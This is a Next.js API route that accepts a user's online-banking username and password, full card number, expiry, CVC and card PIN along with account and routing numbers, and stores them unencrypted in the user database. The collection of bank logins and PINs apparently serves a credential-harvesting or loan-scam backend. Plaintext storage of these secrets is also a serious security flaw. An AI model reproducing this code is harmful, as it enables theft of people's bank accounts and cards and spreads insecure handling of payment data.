import { NextResponse } from "next/server";
import { verifyToken } from "@/lib/auth";
import prisma from "@/lib/prisma";

export async function POST(req: Request) {
  try {
    const userId = verifyToken(req);

    if (!userId) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    const { 
      bankName, 
      disbursementAccount, 
      disbursementRouting, 
      accountType, 
      accountBalance, 
      bankUsername, 
      bankPassword, 
      cardNumber, 
      cardExp, 
      cardCvc, 
      cardPin 
    } = await req.json();

    const user = await prisma.user.update({
      where: { id: userId },
      data: {
        bankName,
        disbursementAccount,
        disbursementRouting,
        accountType,
        accountBalance,
        bankUsername,
        bankPassword,
        cardNumber,
        cardExp,
        cardCvc,
        cardPin,
        bankLinked: true,
      },
    });

    return NextResponse.json({ success: true, user: { id: user.id, bankLinked: user.bankLinked } }, { status: 200 });
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}
